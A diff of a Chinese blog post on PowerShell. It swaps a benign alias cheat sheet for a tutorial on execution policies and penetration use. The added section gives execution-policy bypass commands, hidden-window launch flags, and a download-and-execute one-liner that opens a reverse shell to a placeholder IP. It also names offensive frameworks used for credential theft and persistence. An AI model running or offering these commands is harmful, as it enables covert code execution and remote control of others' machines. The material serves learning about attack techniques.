@@ -9,449 +9,15 @@
     <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg">
 <meta name="description" content="`Gmeek-html<img src='https://erainnovator.com/wp-content/uploads/2021/04/PowerShell.png'>`
 
-## 获取 PowerShell Command一覧
-
-```
-$ gcm　或者   $ get-command
-```
-
-## 获取 PowerShell Alias一覧
-
-```
-$ gal　或者   $ Get-Alias
-```
-
-`Gmeek-html<img src='https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png'>`
-
-## PowerShell Alias一覧
-
-|PowerShell Alias|PowerShell Command|例子|
-|---|---|---|
-|`gcm` 👙 |  Get-Command|例：`Get-Command Get-*`　查找所有以 Get- 开头的 cmdlets|
-|`gal`👙 |  Get-Alias|显示PowerShell Alias一覧|
-|`pwd`🔥|  Get-Location|显示当前所在目录|
-|gl|  Get-Location|同上|
-|`ls`🔥|  Get-ChildItem|列出当前目录下的所有文件和目录|
-|`dir`🔥|  Get-ChildItem|同上|
-|gci|  Get-ChildItem|同上|
-|`cd`🔥|   Set-Location|例：`Set-Location C:\Users\YourName\Documents`  切换文档目录|
-|chdir|Set-Location|同上|
-|sl|  Set-Location|同上|
-|`copy`🔥|  Copy-Item|例：`Copy-Item C:\source\test.txt C:\destination\`  复制文件 test.txt 到另一个目录|
-|`cp`🔥|  Copy-Item|同上|
-|cpi|  Copy-Item|同上|
-|`mv`🔥| Move-Item|例：`Move-Item C:\temp\oldname.txt C:\temp\newfolder\newname.txt`  将文件 oldname.txt 移动到 newfolder 并重命名为 newname.txt|
-|move|  Move-Item|同上|
-|mi|  Move-Item|同上|
-|`ren`🔥|  Rename-Item|例：`Rename-Item C:\temp\oldname.txt C:\temp\newname.txt`  将文件 oldname.txt 重命名为 newname.txt|
-|rni|  Rename-Item|同上|
-|`md`🔥|  mkdir|
-|`del`🔥|  Remove-Item|例：`Remove-Item C:\temp\test.txt -Force`  删除名为 test.txt 的文件|
-|`rm`🔥|  Remove-Item|同上|
-|`rmdir`🔥|  Remove-Item|同上|
-|erase|  Remove-Item|同上|
-|rd|  Remove-Item|同上|
-|ri|  Remove-Item|同上|
-|`write`🔥|  Write-Host|例：`Write-Host 'Hello, world!'`  输出 Hello, world!|
-|`echo`🔥|  Write-Output|例：`Write-Output 'Hello, world!'`  输出 Hello, world!|
-|`clear`🔥|Clear-Host|清除控制台屏幕|
-|`cls`🔥|  Clear-Host|同上|
-|`diff`🔥|  Compare-Object|例：`$list1 = 1..5 $list2 = 2..6 Compare-Object -ReferenceObject $list1 -DifferenceObject $list2`  比较两个数字列表的不同之处|
-|`compare`🔥|  Compare-Object|同上|
-|**进程**|**Process**|**⇣⇣⇣⇣⇣**|
-|`ps`🔥|  Get-Process|获取所有运行中的进程|
-|gps|  Get-Process|同上|
-|start|  Start-Process|例：`Start-Process notepad`  启动记事本应用程序|
-|saps|  Start-Process|同上|
-|kill|  Stop-Process|例：`Stop-Process -Name notepad`  终止所有名为 notepad 的进程|
-|spps|  Stop-Process|同上|
-|**服务**|**Service**|**⇣⇣⇣⇣⇣**|
-|`gsv`🔥|  Get-Service|获取所有服务的状态|
-|sasv|  Start-Service|例：`Start-Service -Name spooler`  启动 Print Spooler 服务|
-|spsv|  Stop-Service|例：`Stop-Service -Name spooler`  停止 Print Spooler 服务|
-|rssv|  Restart-Service|例：`Restart-Service -Name spooler`  重启 Print Spooler 服务|
-|**任務**|**Job**|**⇣⇣⇣⇣⇣**|
-|`gjb`🔥|  Get-Job|
-|sajb|  Start-Job|
-|spjb|  Stop-Job|
-|wjb|  Wait-Job|
-|**文件操作**|**Content**|**⇣⇣⇣⇣⇣**|
-|`cat`🔥|  Get-Content|例：`$content = Get-Content -Path 'C:\temp\input.txt'`  读取文件内容|
-|`type`🔥|  Get-Content|同上|
-|gc|  Get-Content|同上|
-|sc|  Set-Content|例：`'Hello, world!' \| Set-Content -Path 'C:\temp\output.txt'`  写入文件内容|
-|ac|  Add-Content|例：`'Another line' \| Add-Content -Path 'C:\temp\output.txt'` 添加文件内容|
-|clc|  Clear-Content|
-|**CSV操作**|**CSV**|**⇣⇣⇣⇣⇣**|
-|ipcsv|  Import-Csv|例：`$data = Import-Csv -Path 'C:\temp\data.csv'`  从 CSV 文件导入数据|
-|epcsv|  Export-Csv|例：`$data \| Export-Csv -Path 'C:\temp\output.csv' -NoTypeInformatio`  将数据导出为 CSV 文件|
-|**网络请求**|**WebRequest**|**⇣⇣⇣⇣⇣**|
-|`wget`🔥|  Invoke-WebRequest|例：`Invoke-WebRequest -Uri 'https://api.github.com/repos/powershell/powershell/releases/latest'`  获取 GitHub 上最新发布的版本信息|
-|`curl`🔥|  Invoke-WebRequest|同上|
-|iwr|  Invoke-WebRequest|同上|
-|**その他**|**Others**|**⇣⇣⇣⇣⇣**|
-|`man`🔥|  help|例：`Get-Help Get-Process`  获取 Get-Process 的帮助文档|
-|ise|  powershell_ise.exe|
-|%|    ForEach-Object|
-|where|  Where-Object|例：`Get-Process \| Where-Object { $_.CPU -gt 10 }`  获取 CPU 占用率大于 10% 的所有进程|
-|?|    Where-Object|同上|
-|asnp| Add-PSSnapin|
-|CFS|  ConvertFrom-String|
-|clhy| Clear-History|
-|cli|  Clear-Item|
-|clp|  Clear-ItemProperty|
-|clv|  Clear-Variable|
-|cnsn| Connect-PSSession|
-|cpp|  Copy-ItemProperty|
-|cvpa|  Convert-Path|
-|dbp|  Disable-PSBreakpoint|
-|dnsn|  Disconnect-PSSession|
-|ebp|  Enable-PSBreakpoint|
-|ipal|  Import-Alias|
-|epal|  Export-Alias|
-|epsn|  Export-PSSession|
-|etsn|  Enter-PSSession|
-|exsn|  Exit-PSSession|
-|fc|  Format-Custom|
-|fhx|  Format-Hex|
-|fl|  Format-List|
-|foreach|  ForEach-Object|
-|ft|  Format-Table|
-|fw|  Format-Wide|
-|`gbp`🌛|  Get-PSBreakpoint|
-|`gcb`🌛|  Get-Clipboard|
-|`gcs`🌛|  Get-PSCallStack|
-|`gdr`🌛|  Get-PSDrive|
-|`gi`🌛|  Get-Item|
-|`gin`🌛|  Get-ComputerInfo|
-|`gm`🌛|  Get-Member|
-|`gmo`🌛|  Get-Module|
-|`gp`🌛|  Get-ItemProperty|
-|`gpv`🌛|  Get-ItemPropertyValue|
-|`gsn`🌛|  Get-PSSession|
-|`gsnp`🌛|  Get-PSSnapin|
-|`gtz`🌛|  Get-TimeZone|
-|`gu`🌛|  Get-Unique|
-|`gv`🌛|  Get-Variable|
-|`gwmi`🌛|  Get-WmiObject|例：`Get-WmiObject -Class Win32_OperatingSystem`  获取操作系统信息|
-|`ghy`🌛|  Get-History|
-|`h`🌛|  Get-History|
-|`history`🌛|  Get-History|
-|group|  Group-Object|例：`Get-Process \| Group-Object -Property MainModule.FileName`  按主模块的文件名分组进程|
-|icm|  Invoke-Command|
-|iex|  Invoke-Expression|
-|ihy|  Invoke-History|
-|ii|  Invoke-Item|
-|ipmo|  Import-Module|
-|ipsn|  Import-PSSession|
-|irm|  Invoke-RestMethod|
-|iwmi|  Invoke-WmiMethod|
-|lp|  Out-Printer|
-|measure|  Measure-Object|
-|mount|  New-PSDrive|
-|mp|  Move-ItemProperty|
-|nal|  New-Alias|
-|ndr|  New-PSDrive|
-|ni|  New-Item|例：`New-Item -ItemType Directory -Path .\myFolder`  在当前目录下创建一个名为 myFolder 的新目录|
-|nmo|  New-Module|
-|npssc|  New-PSSessionConfigur|
-|nsn|  New-PSSession|
-|nv|  New-Variable|
-|ogv|  Out-GridView|
-|oh|  Out-Host|
-|popd|  Pop-Location|
-|pushd|  Push-Location|
-|r|  Invoke-History|
-|rbp|  Remove-PSBreakpoint|
-|rcjb|  Receive-Job|
-|rcsn|  Receive-PSSession|
-|rdr|  Remove-PSDrive|
-|rjb|  Remove-Job|
-|rmo|  Remove-Module|
-|rnp|  Rename-ItemProperty|
-|rp|  Remove-ItemProperty|
-|rsn|  Remove-PSSession|
-|rsnp|  Remove-PSSnapin|
-|rujb|  Resume-Job|
-|rv|  Remove-Variable|
-|rvpa|  Resolve-Path|
-|rwmi|  Remove-WmiObject|
-|sal|  Set-Alias|
-|sbp|  Set-PSBreakpoint|
-|scb|  Set-Clipboard|
-|select|  Select-Object|
-|set|  Set-Variable|
-|shcm|  Show-Command|
-|si|  Set-Item|
-|sleep|  Start-Sleep|
-|sls|  Select-String|例：`Select-String -Path 'C:\temp\log.txt' -Pattern 'error'`  在日志文件中搜索含有 'error' 的行|
-|sort|  Sort-Object|例：`Get-Process \| Sort-Object -Property CPU -Desc`   按 CPU 占用率降序排列所有进程|
-|sp|  Set-ItemProperty|
-
-|stz|  Set-TimeZone|
-|sujb|  Suspend-Job|
-|sv|  Set-Variable|
-|swmi|  Set-WmiInstance|在 WMI 中创建或修改实例|
-|tee|  Tee-Object|
-|trcm|  Trace-Command|
-
-
-
-
-
-
-## 常用PowerShell命令
-- `cd hkcu`　　像文件系统那样操作Windows Registry
-- `dir –r | select string 'searchforthis'`　在文件里递回地搜索某个字符串
-- `ps | sort –p ws | select –last 5`　使用内存找到五个进程
-- `Restart-Service DHCP`　　重启一个服务，如DHCP
-- `Get-ChildItem – Force`　　在文件夹里列出所有条目
-- `Get-ChildItem –Force c:\directory –Recurse`　　递归一系列的目录或文件夹
--`Remove-Item C:\tobedeleted –Recurse`　　在目录里移除所有文件而不需要单个移除
-
-- `Get-Content Env:COMPUTERNAME` 获取计算机名
-
-- `Get-WmiObject -Class Win32_OperatingSystem -ComputerName .).Win32Shutdown(2)` 重启当前计算机
-- `Get-WmiObject -Class Win32_ComputerSystem` 获取计算机组成或模型信息
-- `Get-WmiObject -Class Win32_BIOS -ComputerName` 获取当前计算机的BIOS信息
-- `Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName` 列出所安装的修复程序（如QFE或Windows Update文件）
-- `Get-WmiObject -Class Win32_ComputerSystem -Property UserName -ComputerName` 获取当前登录计算机的用户的用户名
-- `Get-WmiObject -Class Win32_Product -ComputerName . | Format-Wide -Column 1` 获取当前计算机所安装的应用的名字
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . | Format-Table -Property IPAddress` 获取分配给当前计算机的IP地址
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . | Select-Object -Property [a-z]* -ExcludeProperty IPX*,WINS*`  获取当前机器详细的IP配置报道
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter 'DHCPEnabled=true' -ComputerName`  找到当前计算机上使用DHCP启用的网络卡
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=true -ComputerName . | ForEach-Object -Process {$_.EnableDHCP()}` 在当前计算机上的所有网络适配器上启用DHCP
-- `Get-WMIObject -ComputerName TARGETMACHINE -List | Where-Object -FilterScript {$_.Name -eq 'Win32_Product'}).Install(\MACHINEWHEREMSIRESIDES\path\package.msi`  在远程计算机上安装MSI包
-- `Get-WmiObject -Class Win32_Product -ComputerName . -Filter 'Name='name_of_app_to_be_upgraded'').Upgrade(\MACHINEWHEREMSIRESIDES\path\upgrade_package.msi`　使用基于MSI的应用升级包升级所安装的应用
-- `Get-WmiObject -Class Win32_Product -Filter 'Name='product_to_remove'' -ComputerName . ).Uninstall()` 从当前计算机移除MSI包
-
-- `Start-Sleep 60; Restart-Computer –Force –ComputerName TARGETMACHINE` 一分钟后远程关闭另一台机器
-- `New-Object -ComObject WScript.Network).AddWindowsPrinterConnection(\printerserver\hplaser3`　添加打印机
-- `New-Object -ComObject WScript.Network).RemovePrinterConnection('\printerserver\hplaser3 '`  移除打印机
-- `invoke-command -computername machine1, machine2 -filepath c:\Script\script.ps1`　进入PowerShell会话。">
+# Powershell的基本概念
+## ps1文件
+一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。">
 <meta property="og:title" content="Vol.6 关于PowerShell命令">
 <meta property="og:description" content="`Gmeek-html<img src='https://erainnovator.com/wp-content/uploads/2021/04/PowerShell.png'>`
 
-## 获取 PowerShell Command一覧
-
-```
-$ gcm　或者   $ get-command
-```
-
-## 获取 PowerShell Alias一覧
-
-```
-$ gal　或者   $ Get-Alias
-```
-
-`Gmeek-html<img src='https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png'>`
-
-## PowerShell Alias一覧
-
-|PowerShell Alias|PowerShell Command|例子|
-|---|---|---|
-|`gcm` 👙 |  Get-Command|例：`Get-Command Get-*`　查找所有以 Get- 开头的 cmdlets|
-|`gal`👙 |  Get-Alias|显示PowerShell Alias一覧|
-|`pwd`🔥|  Get-Location|显示当前所在目录|
-|gl|  Get-Location|同上|
-|`ls`🔥|  Get-ChildItem|列出当前目录下的所有文件和目录|
-|`dir`🔥|  Get-ChildItem|同上|
-|gci|  Get-ChildItem|同上|
-|`cd`🔥|   Set-Location|例：`Set-Location C:\Users\YourName\Documents`  切换文档目录|
-|chdir|Set-Location|同上|
-|sl|  Set-Location|同上|
-|`copy`🔥|  Copy-Item|例：`Copy-Item C:\source\test.txt C:\destination\`  复制文件 test.txt 到另一个目录|
-|`cp`🔥|  Copy-Item|同上|
-|cpi|  Copy-Item|同上|
-|`mv`🔥| Move-Item|例：`Move-Item C:\temp\oldname.txt C:\temp\newfolder\newname.txt`  将文件 oldname.txt 移动到 newfolder 并重命名为 newname.txt|
-|move|  Move-Item|同上|
-|mi|  Move-Item|同上|
-|`ren`🔥|  Rename-Item|例：`Rename-Item C:\temp\oldname.txt C:\temp\newname.txt`  将文件 oldname.txt 重命名为 newname.txt|
-|rni|  Rename-Item|同上|
-|`md`🔥|  mkdir|
-|`del`🔥|  Remove-Item|例：`Remove-Item C:\temp\test.txt -Force`  删除名为 test.txt 的文件|
-|`rm`🔥|  Remove-Item|同上|
-|`rmdir`🔥|  Remove-Item|同上|
-|erase|  Remove-Item|同上|
-|rd|  Remove-Item|同上|
-|ri|  Remove-Item|同上|
-|`write`🔥|  Write-Host|例：`Write-Host 'Hello, world!'`  输出 Hello, world!|
-|`echo`🔥|  Write-Output|例：`Write-Output 'Hello, world!'`  输出 Hello, world!|
-|`clear`🔥|Clear-Host|清除控制台屏幕|
-|`cls`🔥|  Clear-Host|同上|
-|`diff`🔥|  Compare-Object|例：`$list1 = 1..5 $list2 = 2..6 Compare-Object -ReferenceObject $list1 -DifferenceObject $list2`  比较两个数字列表的不同之处|
-|`compare`🔥|  Compare-Object|同上|
-|**进程**|**Process**|**⇣⇣⇣⇣⇣**|
-|`ps`🔥|  Get-Process|获取所有运行中的进程|
-|gps|  Get-Process|同上|
-|start|  Start-Process|例：`Start-Process notepad`  启动记事本应用程序|
-|saps|  Start-Process|同上|
-|kill|  Stop-Process|例：`Stop-Process -Name notepad`  终止所有名为 notepad 的进程|
-|spps|  Stop-Process|同上|
-|**服务**|**Service**|**⇣⇣⇣⇣⇣**|
-|`gsv`🔥|  Get-Service|获取所有服务的状态|
-|sasv|  Start-Service|例：`Start-Service -Name spooler`  启动 Print Spooler 服务|
-|spsv|  Stop-Service|例：`Stop-Service -Name spooler`  停止 Print Spooler 服务|
-|rssv|  Restart-Service|例：`Restart-Service -Name spooler`  重启 Print Spooler 服务|
-|**任務**|**Job**|**⇣⇣⇣⇣⇣**|
-|`gjb`🔥|  Get-Job|
-|sajb|  Start-Job|
-|spjb|  Stop-Job|
-|wjb|  Wait-Job|
-|**文件操作**|**Content**|**⇣⇣⇣⇣⇣**|
-|`cat`🔥|  Get-Content|例：`$content = Get-Content -Path 'C:\temp\input.txt'`  读取文件内容|
-|`type`🔥|  Get-Content|同上|
-|gc|  Get-Content|同上|
-|sc|  Set-Content|例：`'Hello, world!' \| Set-Content -Path 'C:\temp\output.txt'`  写入文件内容|
-|ac|  Add-Content|例：`'Another line' \| Add-Content -Path 'C:\temp\output.txt'` 添加文件内容|
-|clc|  Clear-Content|
-|**CSV操作**|**CSV**|**⇣⇣⇣⇣⇣**|
-|ipcsv|  Import-Csv|例：`$data = Import-Csv -Path 'C:\temp\data.csv'`  从 CSV 文件导入数据|
-|epcsv|  Export-Csv|例：`$data \| Export-Csv -Path 'C:\temp\output.csv' -NoTypeInformatio`  将数据导出为 CSV 文件|
-|**网络请求**|**WebRequest**|**⇣⇣⇣⇣⇣**|
-|`wget`🔥|  Invoke-WebRequest|例：`Invoke-WebRequest -Uri 'https://api.github.com/repos/powershell/powershell/releases/latest'`  获取 GitHub 上最新发布的版本信息|
-|`curl`🔥|  Invoke-WebRequest|同上|
-|iwr|  Invoke-WebRequest|同上|
-|**その他**|**Others**|**⇣⇣⇣⇣⇣**|
-|`man`🔥|  help|例：`Get-Help Get-Process`  获取 Get-Process 的帮助文档|
-|ise|  powershell_ise.exe|
-|%|    ForEach-Object|
-|where|  Where-Object|例：`Get-Process \| Where-Object { $_.CPU -gt 10 }`  获取 CPU 占用率大于 10% 的所有进程|
-|?|    Where-Object|同上|
-|asnp| Add-PSSnapin|
-|CFS|  ConvertFrom-String|
-|clhy| Clear-History|
-|cli|  Clear-Item|
-|clp|  Clear-ItemProperty|
-|clv|  Clear-Variable|
-|cnsn| Connect-PSSession|
-|cpp|  Copy-ItemProperty|
-|cvpa|  Convert-Path|
-|dbp|  Disable-PSBreakpoint|
-|dnsn|  Disconnect-PSSession|
-|ebp|  Enable-PSBreakpoint|
-|ipal|  Import-Alias|
-|epal|  Export-Alias|
-|epsn|  Export-PSSession|
-|etsn|  Enter-PSSession|
-|exsn|  Exit-PSSession|
-|fc|  Format-Custom|
-|fhx|  Format-Hex|
-|fl|  Format-List|
-|foreach|  ForEach-Object|
-|ft|  Format-Table|
-|fw|  Format-Wide|
-|`gbp`🌛|  Get-PSBreakpoint|
-|`gcb`🌛|  Get-Clipboard|
-|`gcs`🌛|  Get-PSCallStack|
-|`gdr`🌛|  Get-PSDrive|
-|`gi`🌛|  Get-Item|
-|`gin`🌛|  Get-ComputerInfo|
-|`gm`🌛|  Get-Member|
-|`gmo`🌛|  Get-Module|
-|`gp`🌛|  Get-ItemProperty|
-|`gpv`🌛|  Get-ItemPropertyValue|
-|`gsn`🌛|  Get-PSSession|
-|`gsnp`🌛|  Get-PSSnapin|
-|`gtz`🌛|  Get-TimeZone|
-|`gu`🌛|  Get-Unique|
-|`gv`🌛|  Get-Variable|
-|`gwmi`🌛|  Get-WmiObject|例：`Get-WmiObject -Class Win32_OperatingSystem`  获取操作系统信息|
-|`ghy`🌛|  Get-History|
-|`h`🌛|  Get-History|
-|`history`🌛|  Get-History|
-|group|  Group-Object|例：`Get-Process \| Group-Object -Property MainModule.FileName`  按主模块的文件名分组进程|
-|icm|  Invoke-Command|
-|iex|  Invoke-Expression|
-|ihy|  Invoke-History|
-|ii|  Invoke-Item|
-|ipmo|  Import-Module|
-|ipsn|  Import-PSSession|
-|irm|  Invoke-RestMethod|
-|iwmi|  Invoke-WmiMethod|
-|lp|  Out-Printer|
-|measure|  Measure-Object|
-|mount|  New-PSDrive|
-|mp|  Move-ItemProperty|
-|nal|  New-Alias|
-|ndr|  New-PSDrive|
-|ni|  New-Item|例：`New-Item -ItemType Directory -Path .\myFolder`  在当前目录下创建一个名为 myFolder 的新目录|
-|nmo|  New-Module|
-|npssc|  New-PSSessionConfigur|
-|nsn|  New-PSSession|
-|nv|  New-Variable|
-|ogv|  Out-GridView|
-|oh|  Out-Host|
-|popd|  Pop-Location|
-|pushd|  Push-Location|
-|r|  Invoke-History|
-|rbp|  Remove-PSBreakpoint|
-|rcjb|  Receive-Job|
-|rcsn|  Receive-PSSession|
-|rdr|  Remove-PSDrive|
-|rjb|  Remove-Job|
-|rmo|  Remove-Module|
-|rnp|  Rename-ItemProperty|
-|rp|  Remove-ItemProperty|
-|rsn|  Remove-PSSession|
-|rsnp|  Remove-PSSnapin|
-|rujb|  Resume-Job|
-|rv|  Remove-Variable|
-|rvpa|  Resolve-Path|
-|rwmi|  Remove-WmiObject|
-|sal|  Set-Alias|
-|sbp|  Set-PSBreakpoint|
-|scb|  Set-Clipboard|
-|select|  Select-Object|
-|set|  Set-Variable|
-|shcm|  Show-Command|
-|si|  Set-Item|
-|sleep|  Start-Sleep|
-|sls|  Select-String|例：`Select-String -Path 'C:\temp\log.txt' -Pattern 'error'`  在日志文件中搜索含有 'error' 的行|
-|sort|  Sort-Object|例：`Get-Process \| Sort-Object -Property CPU -Desc`   按 CPU 占用率降序排列所有进程|
-|sp|  Set-ItemProperty|
-
-|stz|  Set-TimeZone|
-|sujb|  Suspend-Job|
-|sv|  Set-Variable|
-|swmi|  Set-WmiInstance|在 WMI 中创建或修改实例|
-|tee|  Tee-Object|
-|trcm|  Trace-Command|
-
-
-
-
-
-
-## 常用PowerShell命令
-- `cd hkcu`　　像文件系统那样操作Windows Registry
-- `dir –r | select string 'searchforthis'`　在文件里递回地搜索某个字符串
-- `ps | sort –p ws | select –last 5`　使用内存找到五个进程
-- `Restart-Service DHCP`　　重启一个服务，如DHCP
-- `Get-ChildItem – Force`　　在文件夹里列出所有条目
-- `Get-ChildItem –Force c:\directory –Recurse`　　递归一系列的目录或文件夹
--`Remove-Item C:\tobedeleted –Recurse`　　在目录里移除所有文件而不需要单个移除
-
-- `Get-Content Env:COMPUTERNAME` 获取计算机名
-
-- `Get-WmiObject -Class Win32_OperatingSystem -ComputerName .).Win32Shutdown(2)` 重启当前计算机
-- `Get-WmiObject -Class Win32_ComputerSystem` 获取计算机组成或模型信息
-- `Get-WmiObject -Class Win32_BIOS -ComputerName` 获取当前计算机的BIOS信息
-- `Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName` 列出所安装的修复程序（如QFE或Windows Update文件）
-- `Get-WmiObject -Class Win32_ComputerSystem -Property UserName -ComputerName` 获取当前登录计算机的用户的用户名
-- `Get-WmiObject -Class Win32_Product -ComputerName . | Format-Wide -Column 1` 获取当前计算机所安装的应用的名字
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . | Format-Table -Property IPAddress` 获取分配给当前计算机的IP地址
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=TRUE -ComputerName . | Select-Object -Property [a-z]* -ExcludeProperty IPX*,WINS*`  获取当前机器详细的IP配置报道
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter 'DHCPEnabled=true' -ComputerName`  找到当前计算机上使用DHCP启用的网络卡
-- `Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=true -ComputerName . | ForEach-Object -Process {$_.EnableDHCP()}` 在当前计算机上的所有网络适配器上启用DHCP
-- `Get-WMIObject -ComputerName TARGETMACHINE -List | Where-Object -FilterScript {$_.Name -eq 'Win32_Product'}).Install(\MACHINEWHEREMSIRESIDES\path\package.msi`  在远程计算机上安装MSI包
-- `Get-WmiObject -Class Win32_Product -ComputerName . -Filter 'Name='name_of_app_to_be_upgraded'').Upgrade(\MACHINEWHEREMSIRESIDES\path\upgrade_package.msi`　使用基于MSI的应用升级包升级所安装的应用
-- `Get-WmiObject -Class Win32_Product -Filter 'Name='product_to_remove'' -ComputerName . ).Uninstall()` 从当前计算机移除MSI包
-
-- `Start-Sleep 60; Restart-Computer –Force –ComputerName TARGETMACHINE` 一分钟后远程关闭另一台机器
-- `New-Object -ComObject WScript.Network).AddWindowsPrinterConnection(\printerserver\hplaser3`　添加打印机
-- `New-Object -ComObject WScript.Network).RemovePrinterConnection('\printerserver\hplaser3 '`  移除打印机
-- `invoke-command -computername machine1, machine2 -filepath c:\Script\script.ps1`　进入PowerShell会话。">
+# Powershell的基本概念
+## ps1文件
+一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://grapehut.us.kg/post/Vol.6%20-guan-yu-PowerShell-ming-ling.html">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/Meekdai/meekdai.github.io/logo64.jpg">
@@ -517,11 +83,84 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
     <div id="content">
 <div class="markdown-body" id="postBody"><p><img src="https://erainnovator.com/wp-content/uploads/2021/04/PowerShell.png"></p>
-<h2>获取 PowerShell Command一覧</h2>
-<pre class="notranslate"><code class="notranslate">$ gcm　或者   $ get-command
+<h1>Powershell的基本概念</h1>
+<h2>ps1文件</h2>
+<p>一个PowerShell脚本其实就是一个简单的文本文件， 这个文件包含了一系列PowerShell命令，每个命令显示为独立的一行，文件名需要加上.ps1的扩展名。</p>
+<h2>执行策略</h2>
+<p>为防止恶意脚本的执行，PowerShell的执行策略，默认情况下，Restricted:脚本不能运行，可以通过以下命令查看当前的执行策略。</p>
+<ul>
+<li>
+<p>Get-ExecutionPolicy：</p>
+<ul>
+<li>Restricted:脚本不能运行(默认设置)。</li>
+<li>RemoteSigned:本地创建的脚本可以运行，但从网上下载的脚本不能运行(拥有数字证书签名的除外)。</li>
+<li>AllSigned:仅当脚本由受信任的发布者签名时才能运行。</li>
+<li>Unrestricted: 允许所有的script运行。</li>
+</ul>
+</li>
+<li>
+<p>Set-ExecutionPolicy <br>
+可以通过上面命令改变PowerShell的执行策略。</p>
+</li>
+</ul>
+<p>如果要运行PowerShell脚本程序，必须用管理员权限将Restricted策略改成Unrestricted，所以在渗透时，就需要采用一些方法绕过策略来执行脚本， 比如下面这三种。</p>
+<ol>
+<li>绕过本地权限执行<br>
+上传xx.ps1至目标服务器，在CMD环境下，在目标服务器本地执行该脚本，如下所示。</li>
+</ol>
+<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -File xx.ps1
 </code></pre>
-<h2>获取 PowerShell Alias一覧</h2>
-<pre class="notranslate"><code class="notranslate">$ gal　或者   $ Get-Alias
+<ol start="2">
+<li>本地隐藏绕过权限执行脚本</li>
+</ol>
+<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile File xx.ps1
+</code></pre>
+<ol start="3">
+<li>用IEX下载远程PS1脚本绕过权限执行</li>
+</ol>
+<pre class="notranslate"><code class="notranslate">PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonI -NoProfile iex (New-Object Net.WebClient).DownloadString("xxx.ps1");Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+</code></pre>
+<p>上述参数的说明，如下</p>
+<ul>
+<li><code class="notranslate">ExecutionPolicy Bypass</code>绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则</li>
+<li><code class="notranslate">WindowStyle Hidden</code>　隐藏窗口</li>
+<li><code class="notranslate">NoLogo</code>　启动不显示版权标志的PowerShell.</li>
+<li><code class="notranslate">NonInteractive (-Nonl) </code>　非交互模式，PowerShell不为用户提供交互的提示。</li>
+<li><code class="notranslate">NoProfile (-NoP) </code>　PowerShell控制台不加载当前用户的配置文件。</li>
+<li><code class="notranslate">Noexit</code>　执行后不退出Shell。这在使用键盘记录脚本时非常重要。</li>
+</ul>
+<h2>运行脚本</h2>
+<p>运行PowerShell脚本，必须键入完整的路径和文件名，例如，你要运行一个名为a.ps1的脚本，可以键入C:\Scripts\a.ps1</p>
+<h2>管道</h2>
+<p>管道的作用是将一个命令的输出作为另一个命令的输入， 两个命令之间用管道符号<code class="notranslate">|</code> 连接。<br>
+举一个例子、停止所有目前运行中的，以"p"字符开头命名的程序，命令如下所示。</p>
+<pre class="notranslate"><code class="notranslate">PS&gt; get-process p* | stop-process
+</code></pre>
+<h2>Powershell的常用命令</h2>
+<p>在PowerShell下，类似“cmd命令"叫作"cmdlet" ，其命名规范相当一致，都采用"动词-名词”的形式，如New-ltem，动词部分般为Add、 New、Get、Remove、Set等， 命名的别名一般兼容Windows Command和Linux Shell,如Get-Childltem命令使用dir或|s均可，<strong>而且PowerShell命令不区分大小写</strong></p>
+<p>下面以文件操作为例讲解PowerShell命令的基本用法</p>
+<ul>
+<li>新建目录: New-Item -Path 'E:\Test Folder' -ItemType Directory</li>
+<li>新建文件: New-Item -Path new.txt -ItemType File</li>
+<li>删除目录: Remove-Item 'E:\Test Folder'</li>
+<li>显示文本内容: Get-Content new.txt</li>
+<li>置文本内容: Set-Content new.txt -Value "hello, word! "</li>
+<li>追加内容: Add-Content new.txt -Value "i love you"</li>
+<li>清除内容: Clear-Content new.txt</li>
+</ul>
+<h1>Powershell进阶篇</h1>
+<p>常用的PowerShel攻击工具有以下这几种</p>
+<ul>
+<li><code class="notranslate">PowerSplit</code>　这是众多PowerShell攻击工具中被广泛使用的PowerShel后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化等操作。</li>
+<li><code class="notranslate">Nishang</code>　基于PowerShell的渗透测试专用工具， 集成了框架、脚本和各种Payload,包含下载和执行、键盘记录、DNS、 延时命令等脚本。</li>
+<li><code class="notranslate">Empire</code>　基于PowerShel的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块、信息探测、凭据窃取、持久化控制。</li>
+<li><code class="notranslate">PowerCat</code>　Powershel版的NetCat, 有着网络工具中的"瑞士军刀”美誉，它能通过TCP和UDP在网络中读写数据。通过与其他工具结合和重定向，读者可以在脚本中以多种方式使用它。</li>
+</ul>
+<h1>获取 PowerShell Command一覧</h1>
+<pre class="notranslate"><code class="notranslate">PS&gt;  gcm　或者   PS&gt;  get-command
+</code></pre>
+<h1>获取 PowerShell Alias一覧</h1>
